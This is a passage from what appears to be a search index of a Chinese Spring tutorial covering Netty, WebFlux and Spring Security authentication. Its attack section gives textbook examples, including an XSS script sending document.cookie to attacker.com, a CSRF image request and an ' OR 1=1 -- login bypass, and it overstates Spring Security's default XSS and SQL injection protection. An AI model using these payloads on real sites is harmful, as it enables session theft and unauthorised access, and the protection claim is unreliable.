\u7684 webapps \u76ee\u5f55\u4e0b\u3002 \u800c Spring Web \u672c\u8d28\u4e0a\u63d0\u4f9b\u4e86\u4e00\u4e2a DispatcherServlet\uff0c\u5b83\u662f\u4e00\u4e2a Servlet\uff0c\u7528\u6765\u628a\u4e0d\u540c\u7684\u8bf7\u6c42\u5206\u53d1\u7ed9\u4e0d\u540c\u7684 Controller\u3002\u914d\u7f6e DispatcherServlet \u4e5f\u662f\u901a\u8fc7 web.xml \u3002 <web-app> <servlet> <servlet-name>dispatcher</servlet-name> <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class> </servlet> <servlet-mapping> <servlet-name>dispatcher</servlet-name> <url-pattern>/</url-pattern> </servlet-mapping> </web-app>","title":"Servlet"},{"location":"13/#netty","text":"\u548c Servlet \u4e00\u6837\uff0cNetty \u4e5f\u662f\u4e00\u4e2a HTTP \u670d\u52a1\u5668\u3002\u4f46\u662f Netty \u662f\u5f02\u6b65\u7684\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4e0d\u4f1a\u963b\u585e\u7ebf\u7a0b\u3002Netty \u662f\u4e00\u4e2a\u4e8b\u4ef6\u9a71\u52a8\u7684\u6846\u67b6\uff0c\u5b83\u4f7f\u7528\u4e86 Reactor \u6a21\u5f0f\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4f7f\u7528\u4e86\u4e8b\u4ef6\u5faa\u73af\u6765\u5904\u7406\u8bf7\u6c42\u3002 Spring WebFlux \u63d0\u4f9b\u4e86\u4e24\u5c42\u62bd\u8c61\uff0c\u4e00\u5c42\u662f http \u5f00\u5934\u7684\uff0c\u5982 HttpHandler \uff0c\u4e00\u5c42\u662f Web \u5f00\u5934\u7684\uff0c\u5982 WebHandler \u3002\u540e\u8005\u66f4\u9ad8\u7ea7\uff0c\u524d\u8005\u66f4\u5e95\u5c42\u3002 \u8981\u521b\u5efa\u4e00\u4e2a Netty \u670d\u52a1\u5668\uff0c\u4f60\u9700\u8981\u521b\u5efa\u4e00\u4e2a HttpServer \uff0c\u7136\u540e\u8bbe\u7f6e HttpHandler \u3002 public class HelloHandler implements HttpHandler { @Override public Mono<Void> handle(ServerHttpRequest request, ServerHttpResponse response) { return response.writeWith(Mono.just(response.bufferFactory().wrap(\"Hello, Netty!\".getBytes()))); } } public class NettyServer { public static void main(String[] args) { HttpHandler handler = new HelloHandler(); HttpServer server = HttpServer.create().host(\"localhost\").port(8080).handle(handler); server.bindNow(); } } \u53ef\u4ee5\u770b\u5230\uff0c\u4e0e Servlet \u5f88\u76f8\u4f3c\uff0c\u4e0d\u540c\u70b9\u4e00\u662f Netty \u662f\u5f02\u6b65\u7684\uff0c\u4e0d\u540c\u70b9\u4e8c\u662f Netty \u4e0d\u518d\u4f7f\u7528 xml \u914d\u7f6e\u3002","title":"Netty"},{"location":"13/#webflux-web-client","text":"\u4e4b\u524d\u6211\u4eec\u7528\u8fc7\u4e86 RestTemplate \uff0c\u800c\u5b83\u6709\u4e00\u4e2a\u5305\u88c5\u8fc7\u7684 RestClient \uff0c\u800c WebClient \u662f WebFlux \u7684\u5ba2\u6237\u7aef\u3002 \u5bf9\u4e8e RestClient \uff0c\u53ef\u4ee5\u7528\u6d41\u5f0f API \u6765\u6784\u5efa\u8bf7\u6c42\u3002 String result = restClient.get() .uri(\"https://example.com\") .retrieve() .body(String.class); System.out.println(result); \u800c WebClient \u4e5f\u662f\u7c7b\u4f3c\u7684\uff0c\u4f46\u662f\u5b83\u662f\u5f02\u6b65\u7684\u3002 WebClient client = WebClient.create(\"https://example.org\"); Mono<Person> result = client.get() .uri(\"/persons/{id}\", id).accept(MediaType.APPLICATION_JSON) .retrieve() .bodyToMono(Person.class); \u8fd4\u56de\u7684\u662f Mono \u6216 Flux\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5f02\u6b65\u5904\u7406\u8bf7\u6c42\u3002","title":"WebFlux Web Client"},{"location":"13/#webflux-web-filter","text":"WebFlux \u4e5f\u6709 WebFilter \uff0c\u5b83\u662f\u4e00\u4e2a\u8fc7\u6ee4\u5668\uff0c\u53ef\u4ee5\u7528\u6765\u5904\u7406\u8bf7\u6c42\u548c\u54cd\u5e94\u3002 @Component public class LoggingWebFilter implements WebFilter { @Override public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) { System.out.println(\"Request: \" + exchange.getRequest().getPath()); return chain.filter(exchange).doOnSuccess(aVoid -> { System.out.println(\"Response: \" + exchange.getResponse().getStatusCode()); }); } }","title":"WebFlux Web Filter"},{"location":"14/","text":"Spring \u901f\u6210 Ch14 Spring Security Spring \u751f\u6001\u5708\u4e2d\u6709\u4e24\u4e2a\u4e3b\u6d41\u7684\u5b89\u5168\u6846\u67b6\uff1aApache Shiro \u548c Spring Security\u3002Spring Security \u662f Spring \u5b98\u65b9\u7684\u5b89\u5168\u6846\u67b6\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u5957\u5b8c\u6574\u7684\u5b89\u5168\u89e3\u51b3\u65b9\u6848\uff0c\u5305\u62ec\u8ba4\u8bc1\u3001\u6388\u6743\u3001\u653b\u51fb\u9632\u62a4\u7b49\u3002Shiro \u66f4\u4e3a\u8f7b\u91cf\uff0c\u4e5f\u662f\u4e00\u4e2a\u4e0d\u9519\u7684\u9009\u62e9\u3002\u8fd9\u91cc\u6211\u4eec\u53ea\u4ecb\u7ecd Spring Security\u3002 \u8fd9\u91cc\u6211\u4eec\u7684\u6f14\u793a\u4f7f\u7528 Spring WebFlux\u3002\u5728\u8fd9\u91cc\u4f7f\u7528 Reactive \u7248\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u5c55\u793a Spring WebFlux \u7684\u5e94\u7528\uff0c\u4f46\u8fd9\u4e0d\u5f71\u54cd Spring Security \u7684\u5b66\u4e60\u3002 Spring Security \u4e09\u5927\u804c\u80fd \u653b\u51fb\u9632\u62a4\uff08Attack Protection\uff09\uff0c\u5305\u62ec\u9632\u6b62\u5e38\u89c1\u7684\u7f51\u7edc\u5b89\u5168\u653b\u51fb\uff0c\u5982 CSRF\u3001XSS\u7b49\u3002 \u8ba4\u8bc1\uff08Authentication\uff09\uff0c\u9a8c\u8bc1\u7528\u6237\u7684\u8eab\u4efd\u3002 \u9274\u6743\uff08Authorization\uff09\uff0c\u63a7\u5236\u7528\u6237\u5bf9\u8d44\u6e90\u7684\u8bbf\u95ee\u6743\u9650\u3002 \u653b\u51fb\u9632\u62a4 \u5e38\u89c1\u7684\u7f51\u7edc\u5b89\u5168\u653b\u51fb\u53ca\u5176\u539f\u7406 CSRF\uff08Cross-Site Request Forgery\uff09 CSRF \u662f\u4e00\u79cd\u7f51\u7edc\u653b\u51fb\uff0c\u653b\u51fb\u8005\u5229\u7528\u7528\u6237\u7684\u767b\u5f55\u72b6\u6001\u53d1\u8d77\u6076\u610f\u8bf7\u6c42\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f2a\u9020\u8bf7\u6c42\uff0c\u8ba9\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u6076\u610f\u64cd\u4f5c\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u7528\u6237\u5728 http://bank.com/transfer \u9875\u9762\u4e0a\u767b\u5f55\u4e86\u94f6\u884c\u8d26\u53f7\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u53e6\u4e00\u4e2a\u9875\u9762\u4e0a\u653e\u7f6e\u4e00\u4e2a <img src=\"http://bank.com/transfer?to=attacker&amount=1000\"> \u7684\u56fe\u7247\uff0c\u5f53\u7528\u6237\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\u65f6\uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u52a0\u8f7d\u8fd9\u4e2a\u56fe\u7247\u3002\u56e0\u4e3a\u7528\u6237\u7684\u7f51\u7edc\u73af\u5883\u4e2d\u5df2\u7ecf\u6709\u4e86\u94f6\u884c\u7684 Cookie\uff0c\u6240\u4ee5\u8fd9\u4e2a\u8bf7\u6c42\u4f1a\u5e26\u4e0a\u7528\u6237\u7684 Cookie\uff0c\u4ece\u800c\u6267\u884c\u4e86\u8f6c\u8d26\u64cd\u4f5c\u3002 XSS\uff08Cross-Site Scripting\uff09 XSS \u662f\u4e00\u79cd\u7f51\u7edc\u653b\u51fb\uff0c\u653b\u51fb\u8005\u5728\u7f51\u9875\u4e2d\u6ce8\u5165\u6076\u610f\u811a\u672c\uff0c\u5f53\u7528\u6237\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\u65f6\uff0c\u811a\u672c\u4f1a\u5728\u7528\u6237\u7684\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u3002\u8fd9\u6837\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u83b7\u53d6\u7528\u6237\u7684 Cookie\u3001\u5bc6\u7801\u7b49\u4fe1\u606f\u3002 \u8fd9\u79cd\u653b\u51fb\u5f88\u50cf SQL \u6ce8\u5165\uff0c\u53ea\u4e0d\u8fc7 SQL \u6ce8\u5165\u662f\u653b\u51fb\u6570\u636e\u5e93\uff0c\u800c XSS \u662f\u653b\u51fb\u7528\u6237\u3002 \u4e00\u79cd\u5e38\u89c1\u7684 XSS \u653b\u51fb\u662f\u5728\u8bc4\u8bba\u6846\u4e2d\u6ce8\u5165\u811a\u672c\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\u65f6\uff0c\u811a\u672c\u4f1a\u5728\u4ed6\u4eec\u7684\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u3002\u4f8b\u5982\uff0c\u653b\u51fb\u8005\u5728\u8bc4\u8bba\u6846\u4e2d\u8f93\u5165 <script>fetch('http://attacker.com?cookie=' + document.cookie)</script> \uff0c\u8fd9\u6837\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\u65f6\uff0c\u5c31\u4f1a\u5411 http://attacker.com \u53d1\u9001\u8bf7\u6c42\uff0c\u4ece\u800c\u6cc4\u9732 Cookie\u3002 SQL \u6ce8\u5165 SQL \u6ce8\u5165\u662f\u4e00\u79cd\u7f51\u7edc\u653b\u51fb\uff0c\u653b\u51fb\u8005\u5728\u8f93\u5165\u6846\u4e2d\u8f93\u5165\u6076\u610f SQL \u8bed\u53e5\uff0c\u5f53\u8fd9\u4e2a SQL \u8bed\u53e5\u88ab\u62fc\u63a5\u5230\u6570\u636e\u5e93\u67e5\u8be2\u4e2d\u65f6\uff0c\u5c31\u4f1a\u6267\u884c\u8fd9\u4e2a SQL \u8bed\u53e5\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u4e00\u4e2a\u767b\u5f55\u9875\u9762\u7684 SQL \u67e5\u8be2\u662f SELECT * FROM users WHERE username = '${username}' AND password = '${password}' \uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8f93\u5165 ' OR 1=1 -- \uff0c\u8fd9\u6837 SQL \u67e5\u8be2\u5c31\u53d8\u6210\u4e86 SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '${password}' \uff0c\u8fd9\u6837\u5c31\u7ed5\u8fc7\u4e86\u5bc6\u7801\u9a8c\u8bc1\u3002 \u70b9\u51fb\u52ab\u6301 \u70b9\u51fb\u52ab\u6301\u662f\u4e00\u79cd\u7f51\u7edc\u653b\u51fb\uff0c\u653b\u51fb\u8005\u5728\u4e00\u4e2a\u900f\u660e\u7684 iframe \u4e2d\u653e\u7f6e\u4e00\u4e2a\u6076\u610f\u7f51\u9875\uff0c\u7136\u540e\u5c06\u8fd9\u4e2a iframe \u653e\u5728\u4e00\u4e2a\u770b\u4f3c\u65e0\u5bb3\u7684\u9875\u9762\u4e0a\u3002\u5f53\u7528\u6237\u70b9\u51fb\u8fd9\u4e2a\u9875\u9762\u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u70b9\u51fb\u4e86 iframe \u4e2d\u7684\u6076\u610f\u7f51\u9875\u3002 \u4f8b\u5982\uff0c\u653b\u51fb\u8005\u5728\u4e00\u4e2a\u900f\u660e\u7684 iframe \u4e2d\u653e\u7f6e\u4e00\u4e2a\u94f6\u884c\u8f6c\u8d26\u9875\u9762\uff0c\u7136\u540e\u5c06\u8fd9\u4e2a iframe \u653e\u5728\u4e00\u4e2a\u770b\u4f3c\u65e0\u5bb3\u7684\u9875\u9762\u4e0a\u3002\u5f53\u7528\u6237\u70b9\u51fb\u8fd9\u4e2a\u9875\u9762\u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u70b9\u51fb\u4e86\u94f6\u884c\u8f6c\u8d26\u9875\u9762\uff0c\u4ece\u800c\u6267\u884c\u4e86\u8f6c\u8d26\u64cd\u4f5c\u3002 \u914d\u7f6e Spring Security \u8fdb\u884c\u653b\u51fb\u9632\u62a4 Spring Security \u4e2d\uff0c\u6240\u6709\u7684\u529f\u80fd\u90fd\u662f\u901a\u8fc7 SecurityFilterChain \u5b9e\u73b0\u7684\u3002\u5982\u540d\u5b57\u6240\u793a\uff0cSecurityFilterChain \u662f\u4e00\u4e2a\u8fc7\u6ee4\u5668\u94fe\uff0c\u5b83\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u7684\u8fc7\u6ee4\u5668\uff0c\u6bcf\u4e2a\u8fc7\u6ee4\u5668\u8d1f\u8d23\u4e00\u4e2a\u529f\u80fd\u3002 \u5bf9\u4e8e Spring Web\uff0c\u8fd9\u4e2a\u8fc7\u6ee4\u5668\u662f Servlet Filter\uff1b\u5bf9\u4e8e Spring WebFlux\uff0c\u8fd9\u4e2a\u8fc7\u6ee4\u5668\u662f WebFilter\u3002\u4e0d\u8fc7\uff0c\u4e24\u8005\u7684\u529f\u80fd\u662f\u4e00\u6837\u7684\u3002 Spring Security \u9ed8\u8ba4\u5f00\u542f\u4e86\u5168\u90e8\u7684\u653b\u51fb\u9632\u62a4\u529f\u80fd\uff0c\u5305\u62ec CSRF\u3001XSS\u3001SQL \u6ce8\u5165\u7b49\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u6765\u5173\u95ed\u8fd9\u4e9b\u529f\u80fd\u3002 @Configuration @EnableWebFluxSecurity public class SecurityConfig { @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http ) { return http .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); } } \u5982\u679c\u662f Servlet \u7248\u672c\uff0c\u4f7f\u7528\uff0c @Configuration @EnableWebSecurity public class SecurityConfig { @Bean public SecurityFilterChain securityFilterChain( HttpSecurity http ) { return http .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); } } \u6ce8\u610f\uff0c\u7f51\u4e0a\u7684\u5f88\u591a\u8d44\u6599\u90fd\u7684\u5199\u6cd5\u90fd\u8fc7\u65f6\u4e86\uff0c\u73b0\u5728\u7684\u5199\u6cd5\u53eb lambda DSL\uff0c\u5373 .\u529f\u80fd\u540d(\u53c2\u6570 -> \u53c2\u6570\u8bbe\u7f6e) \u3002\u5982\u679c\u4fdd\u6301\u9ed8\u8ba4\u8bbe\u7f6e\uff0c\u4f7f\u7528 Customizer.withDefaults() \u5373\u53ef\u3002 \u4e0a\u9762\u6bcf\u4e00\u6761\u8bed\u53e5\u90fd\u521b\u5efa\u4e00\u4e2a Filter\uff0c .csrf(csrf -> csrf.disable()) \u5373\u521b\u5efa\u4e86 CsrfWebFilter \uff0c .cors(Customizer.withDefaults()) \u5373\u521b\u5efa\u4e86 CorsWebFilter \u3002\u8fd9\u4e9b Filter \u4f1a\u88ab\u6dfb\u52a0\u5230 SecurityFilterChain \u4e2d\u3002\u6700\u540e\u901a\u8fc7 .build() \u521b\u5efa SecurityFilterChain\u3002 \u8fd9\u4e9b\u653b\u51fb\u7684\u9632\u62a4\u57fa\u672c\u662f\u65e0\u611f\u7684\uff0c\u4e0d\u9700\u8981\u505a\u592a\u591a\u64cd\u4f5c\uff0c\u5747\u9ed8\u8ba4\u5f00\u542f\u3002 \u5355\u4f53\u5e94\u7528\u7684\u8ba4\u8bc1\u4e0e\u9274\u6743 Spring Security \u63d0\u4f9b\u4e86\u591a\u79cd\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u5305\u62ec\u7528\u6237\u540d\u5bc6\u7801\u8ba4\u8bc1\u3001OAuth2 \u8ba4\u8bc1\u7b49\u3002\u5728\u8fd9\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u53ea\u4ecb\u7ecd\u7528\u6237\u540d\u5bc6\u7801\u8ba4\u8bc1\uff0c\u5e76\u81ea\u5df1\u5b9e\u73b0 JWT \u8ba4\u8bc1\u3002 \u8ba4\u8bc1\u4fe1\u606f\u7684\u4f20\u9012 \u8ba4\u8bc1\u4fe1\u606f\u7684\u4f20\u9012\u6709\u4e24\u79cd\u65b9\u5f0f\uff1aCookie \u548c Token\u3002 Cookie \u662f\u4e00\u79cd\u5b58\u50a8\u5728\u6d4f\u89c8\u5668\u4e2d\u7684\u4fe1\u606f\uff0c\u5b83\u4f1a\u968f\u7740\u6bcf\u6b21\u8bf7\u6c42\u4e00\u8d77\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002Cookie \u6709\u4e24\u79cd\uff1a\u4f1a\u8bdd Cookie \u548c\u6301\u4e45 Cookie\u3002\u4f1a\u8bdd Cookie \u662f\u4e00\u79cd\u4e34\u65f6 Cookie\uff0c\u5b83\u4f1a\u5728\u6d4f\u89c8\u5668\u5173\u95ed\u65f6\u88ab\u5220\u9664\uff1b\u6301\u4e45 Cookie \u662f\u4e00\u79cd\u957f\u671f Cookie\uff0c\u5b83\u4f1a\u5728\u6d4f\u89c8\u5668\u5173\u95ed\u65f6\u88ab\u4fdd\u5b58\u3002 \u4e0d\u8fc7\uff0c\u73b0\u5728\u7684\u5927\u90e8\u5206\u7684\u8ba4\u8bc1\u4fe1\u606f\u90fd\u662f\u901a\u8fc7 Token \u4f20\u9012\u7684\u3002Token \u662f\u4e00\u79cd\u77ed\u671f\u7684\u8ba4\u8bc1\u4fe1\u606f\uff0c\u5b83\u4f1a\u5728\u4e00\u6bb5\u65f6\u95f4\u540e\u5931\u6548\u3002\u7b80\u5355\u6765\u8bf4\uff0cToken \u5c31\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5b83\u5305\u542b\u4e86\u7528\u6237\u7684\u4fe1\u606f\uff0c\u5982\u7528\u6237\u540d\u3001\u6743\u9650\u7b49\u3002\u4e0e Cookie \u4e0d\u540c\uff0cToken \u662f\u5b58\u50a8\u5728\u5ba2\u6237\u7aef\u7684\uff0c\u5b83\u4f1a\u5728\u6bcf\u6b21\u8bf7\u6c42\u65f6\u88ab\u53d1\u9001\u5230\u670d\u52a1\u5668\uff0c\u5982\u6b64\uff0c\u670d\u52a1\u5668\u5c31\u662f\u65e0\u72b6\u6001\u7684\u3002 Token \u4e00\u822c\u901a\u8fc7 HTTP \u8bf7\u6c42\u5934\u90e8\u7684 Authorization \u5b57\u6bb5\u4f20\u9012\u3002\u5176\u5185\u5bb9\u6839\u636e Token \u7684\u7c7b\u578b\u4e0d\u540c\u800c\u4e0d\u540c\u3002\u4f46\u683c\u5f0f\u90fd\u662f \u683c\u5f0f \u6570\u636e \u4e2d\u95f4\u6709\u4e00\u4e2a\u7a7a\u683c\u3002 \u5e38\u7528\u7684\u683c\u5f0f\u53ea\u6709\u4e24\u79cd\uff0c Basic \u548c Bearer \u3002\u524d\u8005\u53ea\u7528\u4e8e\u7528\u6237\u540d-\u5bc6\u7801\u8ba4\u8bc1\uff0c\u53c8\u79f0\u4e3a HTTP Basic \u8ba4\u8bc1\uff1b\u540e\u8005\u5e7f\u6cdb\u7528\u4e8e\u591a\u79cd\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u79f0\u4e3a Bearer Token \u8ba4\u8bc1\u3002 Basic \u8ba4\u8bc1\u7684\u683c\u5f0f\u662f Basic base64(username:password) \uff0c\u5176\u4e2d base64(username:password) \u662f \u7528\u6237\u540d:\u5bc6\u7801 \u7684 base64 \u7f16\u7801\u3002\u8fd9\u79cd\u8ba4\u8bc1\u65b9\u5f0f\u4e0d\u5b89\u5168\uff0c\u56e0\u4e3a\u7528\u6237\u540d\u548c\u5bc6\u7801\u662f\u660e\u6587\u4f20\u8f93\u7684\u3002 Bearer Token \u8ba4\u8bc1\u7684\u683c\u5f0f\u662f Bearer token \uff0c\u5176\u4e2d token \u662f Token \u7684\u5185\u5bb9\u3002\u8fd9\u79cd\u8ba4\u8bc1\u65b9\u5f0f\u76f8\u5bf9\u5b89\u5168\uff0c\u56e0\u4e3a Token \u662f\u52a0\u5bc6\u7684\u3002Token \u7684\u5177\u4f53\u5185\u5bb9\u53d6\u51b3\u4e8e\u8ba4\u8bc1\u65b9\u5f0f\u3002 \u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u8868\u5355\u8ba4\u8bc1\uff0c\u5373\u901a\u8fc7\u8868\u5355\u63d0\u4ea4\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002 Spring Security \u8ba4\u8bc1\u4e0e\u9274\u6743\u6d41\u7a0b Spring Security \u7684\u6bcf\u4e2a\u9274\u6743\u8bf7\u6c42\u90fd\u662f\u7531 SecurityContext \u5904\u7406\u7684\u3002\u7531\u4e8e\u6bcf\u4e2a HTTP \u8bf7\u6c42\u90fd\u6709\u72ec\u7acb\u7684\u7ebf\u7a0b\u5904\u7406\uff0c\u56e0\u6b64\u5b58\u50a8\u662f\u901a\u8fc7 ThreadLocal \u5b9e\u73b0\u7684\u3002 \u5f53\u524d\u7ebf\u7a0b\u7684 SecurityContext \u901a\u8fc7 SecurityContextHolder.getContext() \u83b7\u53d6\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u5f53\u524d\u7528\u6237\u7684\u4fe1\u606f\u3002\u8fd9\u4e2a\u4fe1\u606f\u662f\u901a\u8fc7 Authentication \u5bf9\u8c61\u8868\u793a\u7684\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u7528\u6237\u7684\u8eab\u4efd\u3001\u51ed\u8bc1\u3001\u6743\u9650\u7b49\u4fe1\u606f\u3002 SecurityContext context = SecurityContextHolder.createEmptyContext(); Authentication authentication = new TestingAuthenticationToken(\"username\", \"password\", \"ROLE_USER\"); context.setAuthentication(authentication); SecurityContextHolder.setContext(context); \u4e0a\u9762\u7684\u4ee3\u7801\u521b\u5efa\u4e86\u4e00\u4e2a SecurityContext \uff0c\u5e76\u8bbe\u7f6e\u4e86\u4e00\u4e2a Authentication \u5bf9\u8c61\u3002\u8fd9\u4e2a Authentication \u5bf9\u8c61\u8868\u793a\u4e86\u4e00\u4e2a\u7528\u6237\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u7528\u6237\u540d\u3001\u5bc6\u7801\u3001\u6743\u9650\u7b49\u4fe1\u606f\u3002 SecurityFilterChain \u8d1f\u8d23\u628a\u7528\u6237\u8bf7\u6c42\u5904\u7406\u6210 Authentication \u5bf9\u8c61\uff0c\u7136\u540e\u628a\u8fd9\u4e2a\u5bf9\u8c61\u5b58\u50a8\u5230 SecurityContext \u4e2d\u3002 Authentication \u5176\u5b9e\u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u5b9a\u4e49\u5982\u4e0b\uff0c public interface Authentication extends Principal, Serializable { Collection<? extends GrantedAuthority> getAuthorities(); Object getCredentials(); Object getDetails(); Object getPrincipal(); boolean isAuthenticated(); void setAuthenticated(boolean isAuthenticated) throws IllegalArgumentException; } \u5b83\u7531\u56db\u4e2a\u91cd\u8981\u7684\u5c5e\u6027\uff0c Authenticated \uff0c\u662f\u5426\u5df2\u7ecf\u901a\u8fc7\u8ba4\u8bc1\uff1b Principal \uff0c\u7528\u6237\u7684\u8eab\u4efd\uff0c\u5373\u80fd\u8868\u793a\u7528\u6237\u7684\u6807\u8bc6\uff0c\u901a\u5e38\u662f\u7528\u6237\u540d\u6216\u7528\u6237 ID\uff1b Credentials \uff0c\u7528\u6237\u7684\u51ed\u8bc1\uff0c\u5373\u80fd\u9a8c\u8bc1\u7528\u6237\u8eab\u4efd\u7684\u4fe1\u606f\uff0c\u901a\u5e38\u662f\u5bc6\u7801\uff1b Authorities \uff0c\u7528\u6237\u7684\u6743\u9650\uff0c\u5373\u7528\u6237\u80fd\u8bbf\u95ee\u7684\u8d44\u6e90\u3002 Authorities \u662f\u4e00\u4e2a GrantedAuthority \u7684\u96c6\u5408\uff0c GrantedAuthority \u662f\u4e00\u4e2a\u53ea\u6709 getAuthority() \u65b9\u6cd5\u7684\u63a5\u53e3\uff0c\u5b83\u53ea\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u7528\u6237\u7684\u6743\u9650\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u8ba4\u4e3a Authorities \u672c\u8d28\u5c31\u662f\u4e00\u4e9b\u5b57\u7b26\u4e32\uff0c\u5b83\u4eec\u53ef\u4ee5\u8868\u793a\u7528\u6237\u7684\u6743\u9650\u3002 \u9ed8\u8ba4\u72b6\u6001\u4e0b\uff0cSecurityFilterChain \u7684\u8ba4\u8bc1\u6d41\u7a0b\u5982\u4e0b\u3002 Filter \u62e6\u622a\u8bf7\u6c42\u3002Filter \u5148\u6839\u636e\u7279\u5b9a\u7684\u89c4\u5219\u628a HTTP \u8bf7\u6c42\u5904\u7406\u6210 Authentication \u5bf9\u8c61\u3002\u8fd9\u65f6\u5bf9\u8c61\u7684 Authenticated \u5c5e\u6027\u4e3a false \u3002Filter \u4f1a\u628a\u8fd9\u4e2a\u5bf9\u8c61\u653e\u5728 SecurityContext \u4e2d\u3002\u8fd9\u4e2a Filter \u662f AuthenticationFilter \u6216 AuthenticationWebFilter \u3002\u5bf9\u4e8e\u524d\u8005\uff0c\u5728\u521b\u5efa\u65f6\u8981\u63d0\u4ea4 AuthenticationManager \u548c\u4e00\u4e2a AuthenticationConverter \uff0c\u5b83\u4eec\u5206\u522b\u8d1f\u8d23\u8ba4\u8bc1\u548c HTTP \u8bf7\u6c42\u8f6c Authentication \u5bf9\u8c61\u3002\u5bf9\u4e8e\u540e\u8005\uff0c\u53ea\u9700\u8981\u63d0\u4ea4 ReactiveAuthenticationManager \uff0cConverter \u53ef\u4ee5\u7528\u56de\u8c03\u51fd\u6570\u8bbe\u7f6e\u3002 Filter \u628a\u7528\u6237\u8ba4\u8bc1\u7684\u4efb\u52a1\u59d4\u6258\u7ed9 AuthenticationManager \u3002 AuthenticationManager \u4f1a\u6839\u636e Authentication \u5bf9\u8c61\u7684 Principal \u548c Credentials \u8fdb\u884c\u8ba4\u8bc1\u3002 authenticate \u662f AuthenticationManager \u7684\u552f\u4e00\u4e00\u4e2a\u65b9\u6cd5\uff0c\u5b83\u63a5\u53d7\u4e00\u4e2a Authentication \u5bf9\u8c61\uff0c\u8fd4\u56de\u4e00\u4e2a\u8ba4\u8bc1\u540e\u7684 Authentication \u5bf9\u8c61\u3002 AuthenticationManager Servlet \u7248\u672c\u7684\u9ed8\u8ba4\u5b9e\u73b0\u662f ProviderManager \uff0c\u5b83\u4f1a\u628a\u8ba4\u8bc1\u4efb\u52a1\u59d4\u6258\u7ed9\u591a\u4e2a AuthenticationProvider \u3002\u6bcf\u4e2a AuthenticationProvider \u8d1f\u8d23\u4e00\u79cd\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u4f8b\u5982\u7528\u6237\u540d\u5bc6\u7801\u8ba4\u8bc1\u3001OAuth2 \u8ba4\u8bc1\u7b49\u3002\u9664\u4e86 authenticated \u65b9\u6cd5\u5916\uff0c AuthenticationProvider \u8fd8\u6709\u4e00\u4e2a supports \u65b9\u6cd5\uff0c\u5b83\u7684\u7b7e\u540d\u662f boolean supports(Class<?> authentication) \uff0c\u7528\u4e8e\u5224\u65ad\u8fd9\u4e2a AuthenticationProvider \u662f\u5426\u652f\u6301\u8fd9\u79cd\u8ba4\u8bc1\u65b9\u5f0f\u3002\u9ed8\u8ba4\u7684 ProviderManager \u4f1a\u904d\u5386\u6240\u6709\u7684 AuthenticationProvider \uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u652f\u6301\u8fd9\u79cd\u8ba4\u8bc1\u65b9\u5f0f\u7684 AuthenticationProvider \uff0c\u7136\u540e\u8c03\u7528\u5b83\u7684 authenticate \u65b9\u6cd5\u3002\u800c WebFlux \u7248\u672c\u6ca1\u6709 ProviderManager\uff0c\u800c\u662f\u76f4\u63a5\u4f7f\u7528 UserDetailsRepositoryReactiveAuthenticationManager \uff0c\u8fd9\u6bd4 Servlet \u7248\u672c\u5c11\u4e86\u4e00\u5c42\u62bd\u8c61\u3002 AuthenticationProvider \u4f1a\u6839\u636e SecurityContext \u4e2d Authentication \u5bf9\u8c61\u7684 Principal \u548c Credentials \u8fdb\u884c\u8ba4\u8bc1\u3002\u5982\u679c\u8ba4\u8bc1\u6210\u529f\uff0c\u5c31\u8fd4\u56de\u4e00\u4e2a\u8ba4\u8bc1\u540e\u7684 Authentication \u5bf9\u8c61\uff1b\u5982\u679c\u8ba4\u8bc1\u5931\u8d25\uff0c\u5c31\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\u3002 \u9ed8\u8ba4\u7684 AuthenticationProvider \u662f DaoAuthenticationProvider \uff0c\u5b83\u4f1a\u6839\u636e\u7528\u6237\u540d\u548c\u5bc6\u7801\u4ece\u6570\u636e\u5e93\u4e2d\u67e5\u8be2\u7528\u6237\u4fe1\u606f\u3002\u5b83\u4f9d\u8d56\u4e8e UserDetailsService \uff0c UserDetailsService 